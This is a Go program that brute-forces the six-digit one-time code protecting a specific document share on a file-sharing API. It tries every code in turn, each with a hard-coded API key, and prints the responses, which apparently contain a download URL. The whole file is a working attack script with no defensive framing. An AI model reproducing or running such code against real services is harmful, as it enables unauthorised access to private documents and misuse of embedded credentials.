package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
)

func main() {
	apiUrl := "https://api.secure.docusafe.app/shares/45788085-851c-48fd-949e-80574515627d/download/"
	fmt.Println("Brute force  for URL :", apiUrl)
	client := &http.Client{}

	for i := 0; i < 999999; i++ {
		otpIndex := padNumberWithZero(i)
		postBody, _ := json.Marshal(map[string]string{
			"userSecret": otpIndex,
		})

		fmt.Print("call api for otp=", otpIndex)
		responseBody := bytes.NewBuffer(postBody)

		req, err := http.NewRequest("POST", apiUrl, responseBody)
		if err != nil {
			fmt.Print(err.Error())
		}
		req.Header.Add("Accept", "application/json")
		req.Header.Add("Content-Type", "application/json")
		req.Header.Add("x-api-key", "WnmmVqKgtuBfcxFluolne4GLB4dfMh7MRnlswNAyRrjriCcZwcbvDZoTya5gjIph")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(err.Error())
		}
		defer resp.Body.Close()
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(err.Error())
		}
		var responseObject Response
		json.Unmarshal(bodyBytes, &responseObject)
		fmt.Println(string(bodyBytes))
	}
}

type Response struct {
	ID string `json:"s3GetObjectUrl"`
}

func padNumberWithZero(value int) string {
	return fmt.Sprintf("%06d", value)
}
